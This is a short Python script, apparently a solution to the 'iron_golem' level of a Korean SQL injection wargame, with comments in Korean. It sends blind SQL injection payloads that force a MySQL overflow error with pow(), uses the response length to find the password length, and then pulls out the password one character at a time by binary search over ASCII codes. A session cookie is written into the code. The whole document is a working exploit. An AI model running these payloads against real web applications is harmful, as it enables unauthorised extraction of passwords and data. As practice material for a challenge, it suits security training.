import requests

cookies = {'PHPSESSID' : 'nui79padnqo9dshj9fl9m5ani3'}
params={'pw':None}
url = "https://los.rubiya.kr/chall/iron_golem_beb244fe41dd33998ef7bb4211c56c75.php"

# 비밀번호 길이 / 32

for i in range(30,40):
    payload = "' or if(length(pw) = {},pow(12341234,12341234),0)#".format(i)
    params['pw'] = payload
    response = requests.get(url,params=params,cookies=cookies)
#    print(response.text)
    print(len(response.text))

# 비밀번호가 기니까 Binary Search로 접근한다.
pw = ''
for i in range(1,33):
    start,end = 0,255
    while True:
        search = int( (start + end)/2)
        payload = "' or if(ascii(substr(pw,{},1))<= {},pow(12341234,12341234),0)#".format(i,search)
        params['pw'] = payload
        response = requests.get(url,params=params,cookies=cookies)
        if(len(response.text) < 100):
            # 참인경우
            payload = "' or if(ascii(substr(pw,{},1))= {},pow(12341234,12341234),0)#".format(i,search)
            params['pw'] = payload
            response = requests.get(url,params=params,cookies=cookies)
            if(len(response.text) < 100):
                pw = pw + chr(search)
                print('\r[+] find pw : ',pw,end='')
                break
            end = search
        else:
            start = search


